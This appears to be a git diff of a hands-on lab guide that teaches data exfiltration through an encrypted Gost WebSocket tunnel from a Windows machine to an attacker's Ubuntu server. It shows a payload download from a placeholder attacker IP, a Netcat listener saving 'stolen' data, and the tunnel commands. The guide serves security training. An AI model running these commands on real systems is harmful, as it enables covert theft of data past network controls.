@@ -63,6 +63,8 @@ cd Desktop/Labs/GostLab
 
 - Type **"clear"** in the terminal and *resize* it such that it takes up less space.
 
+---
+
 ### Phase 2: Staging the Attack 
 
 As an attacker, you already have your tools pre-staged on your server. We need to set up a delivery method for our Windows payload, a listener to catch the stolen data, and the Gost tunnel exit point.
@@ -77,18 +79,20 @@ As an attacker, you already have your tools pre-staged on your server. We need t
 
 
 
-- *Terminal 1:* - In the terminal you just opened, start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it. Minimize it afterwards:
+- *Terminal 1:* - In the terminal you just opened, move to the **Lab Directory** and start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it. Minimize it afterwards:
 
 ```bash
+cd ~/BnB/GostLab
 python3 -m http.server 8001
 ```
 
 <img width="1118" height="691" alt="image" src="https://github.com/user-attachments/assets/78374cf9-3aaa-4417-80d3-35a8124def32" />
 
 
-- *Terminal 2:* Open up another *Ubuntu Shell* and start a Netcat listener on port 8080. This is the final destination that will save the incoming stolen data to a file. **You should not minimize this one**.
+- *Terminal 2:* Open up another *Ubuntu Shell*, move to the **Lab Directory** and start a Netcat listener on port 8080. This is the final destination that will save the incoming stolen data to a file. **You should not minimize this one**.
 
 ```bash
+cd ~/BnB/GostLab
 nc -lvnp 8080 > exfiltrated_data.csv
 ```
 <img width="765" height="146" alt="image" src="https://github.com/user-attachments/assets/4776caec-91d8-43ae-aea3-bdd7eee2f091" />
@@ -103,20 +107,18 @@ ls -lh
 sudo ./gost -L wss://:443
 ```
 
-<img width="669" height="208" alt="image" src="https://github.com/user-attachments/assets/736d51d0-04c5-4678-93ab-bd1645b250fe" />
+<img width="1319" height="630" alt="image" src="https://github.com/user-attachments/assets/81af4195-3790-4b9f-a5dc-95e98a492a3f" />
 
+
+<br></br>
+
+>[!NOTE]
+>Copy your **<UBUNTU_IP>**, you will need it to know where to exfiltrate the data to. 
 
 ---
 
-### Phase 2: Payload Delivery & Exfiltration (Windows VM)
+### Phase 2: Payload Delivery & Exfiltration
 Now we switch to the compromised Windows machine. We need to download the tunneling tool (Living off the Land) and extract the sensitive data.
-
-- Open a PowerShell terminal. Let's check our "loot" before we steal it:
-
-```powershell
-cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
-```
-<img width="1151" height="112" alt="image" src="https://github.com/user-attachments/assets/a4b9ed61-c81a-471f-b0cd-3089db552467" />
 
 - Download the Gost payload directly from our Ubuntu server into a temporary folder. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**
 
@@ -124,13 +126,9 @@ cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\gost.exe"
 ```
 
-<img width="1205" height="255" alt="image" src="https://github.com/user-attachments/assets/0a7d8e79-123f-4fe0-a787-398b3a56a43b" />
+<img width="908" height="561" alt="image" src="https://github.com/user-attachments/assets/ea6627b9-d52d-43ff-83fb-75c925f403cb" />
 
-- You should also be able to see the **server GET request** in your python server terminal: 
-
-<img width="891" height="231" alt="image" src="https://github.com/user-attachments/assets/955efed3-0336-4e3e-8d51-b3d7f7be42c7" />
-
-- Start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.
+- In the same terminal, start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.
 
 ```powershell
 & "$env:TEMP\gost.exe" -L tcp://:9000/127.0.0.1:8080 -F wss://<UBUNTU_IP>:443
@@ -150,10 +148,9 @@ $client.Close()
 Write-Host "Exfil Complete!" -ForegroundColor Green
 ```
 
-<img width="893" height="371" alt="image" src="https://github.com/user-attachments/assets/46b8ecfc-3299-4ff1-af8c-db3d952b59c0" />
+You will now see a **Connection recieved** message in the Ubuntu Terminal.
 
-
-<img width="881" height="285" alt="image" src="https://github.com/user-attachments/assets/7f0e802d-962a-42e9-a856-61c97e8a2543" />
+<img width="810" height="73" alt="image" src="https://github.com/user-attachments/assets/277bece3-3bab-469b-bbd7-9724583009dd" />
 
 ---
 
